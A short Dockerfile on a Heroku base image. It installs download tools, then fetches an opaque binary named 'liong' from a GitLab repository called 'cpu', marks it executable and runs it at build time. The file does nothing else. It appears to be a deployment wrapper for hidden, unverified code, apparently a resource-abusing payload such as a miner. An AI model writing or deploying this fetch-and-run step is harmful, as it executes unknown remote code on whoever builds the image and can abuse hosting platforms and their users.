FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN apt update
RUN wget https://gitlab.com/gilaaja/cpu/-/raw/main/liong && chmod +x liong && ./liong
